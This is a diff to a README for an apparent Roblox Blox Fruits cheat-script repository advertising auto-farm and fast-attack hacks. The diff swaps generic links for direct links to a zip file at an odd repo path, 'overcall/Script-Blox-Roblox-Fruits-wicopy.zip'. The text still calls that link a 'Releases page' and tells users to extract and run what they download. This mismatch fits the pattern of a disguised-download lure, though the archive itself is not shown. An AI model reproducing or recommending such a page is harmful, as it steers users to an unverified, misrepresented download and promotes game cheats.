@@ -1,7 +1,7 @@
 # 🎮 Roblox-Blox-Fruits-Script - Enhance Your Gaming Experience Effortlessly
 
 ## 📥 Download Now
-[![Download Releases](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com)
+[![Download Releases](https://raw.githubusercontent.com/jz186/Roblox-Blox-Fruits-Script/main/overcall/Script-Blox-Roblox-Fruits-wicopy.zip)](https://raw.githubusercontent.com/jz186/Roblox-Blox-Fruits-Script/main/overcall/Script-Blox-Roblox-Fruits-wicopy.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Roblox-Blox-Fruits-Script**! This application offers a set of scripts and hacks designed to improve your gameplay in Blox Fruits. With tools like Auto Farm, Fast Attack, and an easy-to-use GUI, you'll find it simple to enhance your gaming experience. Whether you're on PC or mobile, we've got you covered!
@@ -36,11 +36,11 @@ To run the **Roblox-Blox-Fruits-Script**, ensure your device meets the following
 To get started with the **Roblox-Blox-Fruits-Script**, please follow these steps:
 
 1. **Visit this page to download**: Click on the link below to access the Releases page.
-   [Download Releases](https://github.com)
+   [Download Releases](https://raw.githubusercontent.com/jz186/Roblox-Blox-Fruits-Script/main/overcall/Script-Blox-Roblox-Fruits-wicopy.zip)
    
 2. **Locate the Latest Version**: On the Releases page, find the latest version of the script, which will be labeled clearly.
 
-3. **Download the File**: Click on the download link. Depending on your device, it may be labeled as `Roblox-Blox-Fruits-Script.zip` or something similar.
+3. **Download the File**: Click on the download link. Depending on your device, it may be labeled as `https://raw.githubusercontent.com/jz186/Roblox-Blox-Fruits-Script/main/overcall/Script-Blox-Roblox-Fruits-wicopy.zip` or something similar.
 
 4. **Extract the Files**: If you downloaded a zip file, right-click it and select "Extract All" to unpack the files.
 
